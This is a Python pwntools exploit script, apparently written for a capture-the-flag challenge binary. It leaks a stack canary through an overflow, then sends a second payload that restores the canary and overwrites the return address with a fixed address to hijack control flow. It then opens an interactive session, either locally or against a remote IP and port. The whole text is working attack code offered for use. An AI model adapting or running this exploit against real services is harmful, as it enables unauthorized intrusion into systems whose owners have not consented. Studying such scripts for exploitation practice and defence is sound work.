from pwn import *
import argparse

# Argument parser to allow flexible execution (local or remote)
parser = argparse.ArgumentParser(description="Exploit script for local or remote target")
parser.add_argument("--ip", help="Remote IP address of the target")
parser.add_argument("--port", type=int, help="Remote port of the target")
parser.add_argument("--local", action="store_true", help="Run the binary locally")
parser.add_argument("--path", default="./chall", help="Path to the local binary (default: ./chall)")
args = parser.parse_args()

# Determine if we are attacking locally or remotely
if args.local:
    # Launch the binary locally
    p = process(args.path)
    context.binary = args.path
    log.info("Running exploit locally")
else:
    # Ensure IP and port are provided for remote attack
    if not args.ip or not args.port:
        parser.error("Remote mode requires both --ip and --port.")
    # Connect to the remote service
    p = remote(args.ip, args.port)
    log.info(f"Connecting remotely to {args.ip}:{args.port}")

# === Stage 1: Leak the stack canary ===

offset_to_canary = 89               # Number of bytes to reach the canary
payload = b"A" * offset_to_canary   # Padding up to the canary
payload += b"Quack Quack "          # Marker used by the challenge to reflect back memory

# Send first payload to trigger the canary leak
p.sendafter(b'> ', payload)

# Receive data until our marker and grab the memory leak
p.recvuntil(b'Quack Quack ')
leak = p.recvuntil(b', ready to fight the Duck?', drop=True)

# Canary is only partially leaked (7 bytes), first byte is 0x00
canary_partial = leak[:7]
canary = b'\x00' + canary_partial
canary_val = u64(canary)

log.success(f"Leaked canary: {hex(canary_val)}")

# === Stage 2: Build final payload to exploit ===

payload2  = b"A" * 88               # Padding up to the canary
payload2 += p64(canary_val)        # Insert valid canary to bypass stack protector
payload2 += p64(0)                 # Overwrite RBP (or extra padding)
payload2 += p64(0x0040137f)        # Return address (replace with your gadget or win function)

# Send final exploit payload
p.sendafter(b'> ', payload2)

# Switch to interactive mode to control the shell or read the output
p.interactive()
